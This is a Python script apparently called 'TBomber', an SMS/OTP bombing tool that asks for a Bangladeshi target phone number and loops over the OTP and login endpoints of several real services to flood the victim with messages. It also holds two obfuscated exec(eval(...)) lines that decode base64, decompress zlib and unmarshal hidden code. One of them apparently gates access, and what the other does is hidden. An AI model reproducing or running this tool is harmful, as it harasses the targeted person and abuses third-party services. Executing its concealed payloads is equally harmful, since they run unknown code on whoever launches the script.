#Coded By Dark Sald3
#A Product Of ToxicNoob
#If You Want To Get Knowledge From This  Source Code, You're Welcomed....
#But If You Want To Copy And Take Cradits, Then Get Out...

import time
import requests
import mechanize
import sys
import os

def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
        
#Don't Delete Or Edit This Line
exec(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 39, 109, 97, 114, 115, 104, 97, 108, 39, 41, 46, 108, 111, 97, 100, 115],chr))(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 122, 108, 105, 98, 34, 41, 46, 100, 101, 99, 111, 109, 112, 114, 101, 115, 115],chr))(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 98, 97, 115, 101, 54, 52, 34, 41, 46, 98, 54, 52, 100, 101, 99, 111, 100, 101],chr))(b'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'))))

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

if(sec==K3Y):
	psb("\n[!] Access Approved.....")
	time.sleep(0.6)
	psb("\n[!] Loading...")
	time.sleep(0.8)
	psb("\n[!] Please Wait.....")
	time.sleep(1)
	
	
	print("\033[92m")
	os.system("clear")
	os.system("figlet TBomber")
	print("          	A Product Of ToxicNoob \033[0;92m")
	time.sleep(0.6)
	print("\033[1;94m────────────────────────────────────────────────────\x1b[1;94m")
	print("\033[1;92m▸ \033[92mAuthor   : Dark Slad3")
	print("\033[1;92m▸ \033[92mGithub   : https://github.com/Toxic-Noob/")
	print("\033[1;92m▸ \033[1;91mNote     : This Tool Is Only For Educational Purpose \x1b[1;92m")
	print("\033[1;92m▸ \033[1;91mNote     : I'm Not Responsible for Any Misuse \x1b[1;92m")
	print("\033[1;94m────────────────────────────────────────────────────")
	print("\033[92m")
	time.sleep(1)
	
	
	print("\033[92m")
	number = input("\n[*] Enter Target Number:> +880")
	tr1 = input("[*] Enter Amount (Default 10):> ")
	if(tr1==""):
		tr=10
	else:
		tr=int(tr1)
	psb("[*] Auto Delay: 4 Seconds...")
	time.sleep(0.5)
	
	num = "880"+number
	num2 = "+880"+number
	tr2 = str(tr)
	global first, middle
	n = num[4:]
	m = num[:6]
	num3 = n+"-"+m
	data={"phone":{"number":num3,"internationalNumber":"+880 "+num3,"nationalNumber":"0"+num3,"e164Number":"+880"+num3,"countryCode":"BD","dialCode":"+880"},"contact":num,"type":"phone"}
	
	
	psb("\n[!] Please wait.....")
	time.sleep(0.6)
	psb("[!] Bombing in Progress....\n")
	time.sleep(1)
	
	op = 0
	while op<=tr:
		try:
			r = br.open("https://www.bioscopelive.com/en/login/send-otp?phone="+num+"&operator=bd-otp")
			op = op + 1
			oj = str(op)
			print("\033[92m["+oj+"] Massege Sent Successfully!")
			if(op==tr):
				psb("\n[*] Bombing Finished!!\n")
				time.sleep(0.5)
				psb("[!] Sent "+tr2+" Massages To 0"+number+" By ToxicBomber.....\n\033[40;37m")
				time.sleep(0.7)
				exit()
			else:
				time.sleep(4)
		except:
			if(op==tr):
				exit()
			else:
				data = {'query': '\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: ""\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n', 'variables': {'phone': number, 'country': '880', 'uuid': '64b9bb81-93f3-4757-9e92-9cfbf34d8039', 'osVersionCode': 'Linux armv8l', 'deviceBrand': 'Chrome', 'deviceModel': '89', 'requestFrom': 'U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s='}}
				response = requests.post("https://api-v4-2.hungrynaki.com/graphql", json=data)
				if response.status_code==200:
					op = op + 1
					oj = str(op)
					print("\033[92m["+oj+"] Massege Sent Successfully!")
					if(op==tr):
						psb("\n[*] Bombing Finished!!\n")
						time.sleep(0.5)
						psb("[!] Sent "+tr2+" Massages To 0"+number+" By ToxicBomber.....\n\033[40;37m")
						time.sleep(0.7)
						exit()
					else:
						time .sleep(4)
				else:
					print("\033[31m[!] Massege Send Failed!")
					time.sleep(4)
	
		response = requests.post("https://lms.10minuteschool.com/api/v4/auth/sendOtp",data=data)
		if response.status_code==200:
			op = op + 1
			oj = str(op)
			print("\033[92m["+oj+"] Massege Sent Successfully!")
			if(op==tr):
				psb("\n[*] Bombing Finished!!\n")
				time.sleep(0.5)
				psb("[!] Sent "+tr2+" Massages To 0"+number+" By ToxicBomber.....\n\033[40;37m")
				time.sleep(0.7)
				exit()
			else:
				time.sleep(4)
		else:
			data = {'query': '\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: ""\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n', 'variables': {'phone': number, 'country': '880', 'uuid': '64b9bb81-93f3-4757-9e92-9cfbf34d8039', 'osVersionCode': 'Linux armv8l', 'deviceBrand': 'Chrome', 'deviceModel': '89', 'requestFrom': 'U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s='}}
			response = requests.post('https://api-v4-2.hungrynaki.com/graphql', json=data)
			if response.status_code==200:
				op = op + 1
				oj = str(op)
				print("\033[92m["+oj+"] Massege Sent Successfully!")
				if(op==tr):
					psb("\n[*] Bombing Finished!!\n")
					time.sleep(0.5)
					psb("[!] Sent "+tr2+" Massages To 0"+number+" By ToxicBomber.....\n\033[40;37m")
					time.sleep(0.7)
					exit()
				else:
					time.sleep(4)
			else:
				print("\033[31m[!] Massege Send Failed!")
				time.sleep(4)
	
		response = requests.post( "https://api2.bongobd.com/api/login/send-otp",data={"operator":"all","msisdn":num2})
		data = {'query': '\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: ""\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n', 'variables': {'phone': number, 'country': '880', 'uuid': '64b9bb81-93f3-4757-9e92-9cfbf34d8039', 'osVersionCode': 'Linux armv8l', 'deviceBrand': 'Chrome', 'deviceModel': '89', 'requestFrom': 'U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s='}}
		requests.post('https://api-v4-2.hungrynaki.com/graphql', json=data)
		if response.status_code==200:
			op = op + 1
			oj = str(op)
			print("\033[92m["+oj+"] Massege Sent Successfully!")
			if(op==tr):
				psb("\n[*] Bombing Finished!!\n")
				time.sleep(0.5)
				psb("[!] Sent "+tr2+" Massages To 0"+number+" By ToxicBomber.....\n\033[40;37m")
				time.sleep(0.7)
				exit()
			else:
				time.sleep(4)
		else:
			data = {'query': '\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: ""\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n', 'variables': {'phone': number, 'country': '880', 'uuid': '64b9bb81-93f3-4757-9e92-9cfbf34d8039', 'osVersionCode': 'Linux armv8l', 'deviceBrand': 'Chrome', 'deviceModel': '89', 'requestFrom': 'U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s='}}
			response = requests.post('https://api-v4-2.hungrynaki.com/graphql', json=data)
			if response.status_code==200:
				op = op + 1
				oj = str(op)
				print("\033[92m["+oj+"] Massege Sent Successfully!")
				if(op==tr):
					psb("\n[*] Bombing Finished!!\n")
					time.sleep(0.5)
					psb("[!] Sent "+tr2+" Massages To 0"+number+" By ToxicBomber.....\n\033[40;37m")
					time.sleep(0.7)
					exit()
				else:
					time.sleep(4)
			else:
				print("\033[31m[!] Massege Send Failed!")
				time.sleep(4)
	
else:
#Don'T Delete Or Edit This Line
	exec(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 39, 109, 97, 114, 115, 104, 97, 108, 39, 41, 46, 108, 111, 97, 100, 115],chr))(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 122, 108, 105, 98, 34, 41, 46, 100, 101, 99, 111, 109, 112, 114, 101, 115, 115],chr))(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 98, 97, 115, 101, 54, 52, 34, 41, 46, 98, 54, 52, 100, 101, 99, 111, 100, 101],chr))(b'eJyNlEuP2lYUx2FmkkyTmT7yaNMm7aKq1I6QYrCxAWkS1TBgsI3fxoBUIcM1fmNsbDBWukqkdttv0C7zldh2lXW76qr3ThI16qb11f2dh+7534es83vpX983cH4P5+ZPCKtklUEJlF+WwBE4huME3AA3wS1wCj64jm+DOzBzBuNz8CG0H8H4Y/AJtLdgdBec24+soxfHL8r/qXMP3IdVJ+AB9JDCXfAp+AyuQOtOoX8Otb7831oP4O7nsOoh+Pyt3oNr/50qtPZXb9TAFy/Kb0a5BB6ppYvHi+P33gP5N97azUOI56VfSz+VlmVQBkcvT5+Xr0ovyr+VYd2xsCi/V3gE5wmc91DhfQgblv5w9mP559JzuNkvR/GJWnpVSlDNxdHh6En1cDybzV6VD+XZdfKv08tuUXDZ6tnh9mXgbtJFFK6fIckNwk24Q/H4MjDDOTCfPbkMooUZbJDzbulF+XDiRe7q4vhwApVnh6PZLEF3uZZPkEhyE+Jw+k4Fpf5Ah0/uoHzp9Qya1y5CiLBGiBAShBThO4RvEUyEDYKDECBcIDxBAAhfIxQIcwQLYYFAIdTR3c7gISx2L/h+sMV9Ws/xqt0xcI33Vxpv+NLI1I2Bqq+NuqsrrtHmWcfeDaf2mo6F6W7nWEPBHvamlBqP8Wo3w+TxdjjCuNqaLOZ6tQKUfFCj4nGNkggrWq2wcN63QMXcNnZGLW1plLQPdCXUWbllS1d0KA96VWfoG+Fe3rF+nmlYxyQVNSsEtumlVIjJmNgg243asFDnLCGlrDbaMV4eYFRYyGJDS5z2dN3uRgU77JOdPqCX247AUp7hY5iBZ8rKI/tZTik5CSiXlOrqeky1kiEvLHk/4GsTvisa7Y659wbSGLOXXZ20Kljdcx1pxS0ZxeSZHlvvSnVnWN2vKzsi2E56Lum2ao5r92IOpwcEwYG42gLExsIm2qI6kCo5HzmyFno847A5v6P3abJMrqZzlsqlNFv0+pWeQIhWXqyYYNUq9Mq22m55eqLicoMWQ0peWc3YZMDAsJPpSCgWyoCqCrtUG3cqcc/b4ELXXlEDzlu2ZF5Y72qbsOmZA1wY6sutw7X1CKtLPM6bdkFWibjwNnTfoNvagBYYum3Ro3qny9GSSLORTTt2W6fpYte1ZJqJaDof0Aq/SzdYdREmFgvvpbh9jzS0MUcTcUtnmkyT4PbjtcC1HXLEkaYj9815AIKsWSTKvmH2d4Vidax1YyoLjqa6Y9ATTT2qOBHOANyN3JEaClfawhSiebDkmWp7PLamW63XyaxcnmzX0qhmGniL7Olpj0vni2QfGGYl2I55XWVTRfO5eD00gsgV9FqfCbIrPBP6srPHJYsL4V8Kuj09N5vMxg/jhBPb/GKl+h5dETt2jaCAqE0Wo24QKJHViCtjhfB6y3qRpF0rDhW+7wf0Wi1a7k6RCNnkgtFw2tNJBXeYZkXqJnE33eh5Wq+o4oQ3RFyb7M2RsA34kSMQnscWIcnOedNUsT0RWmbVyONMrYvOyvczNp7WFG3DaAbB8Wos7tas25paWhVvDIOJrPhkfamq3mpur81BU03G2moynPQ3c5cf+1Ejy3qYb8YU73mJGy3jcFsLeZVKawy3h0+w2e7Djih6mRuH/Q4vXFUGXgXnaCxr792VqolsRIUq2wiyARH5dXdsP30qoPZl5dYCcmsGh+OFk7xpYP/gbRcLI5AF1nUXS84g/gYlufUI'))))
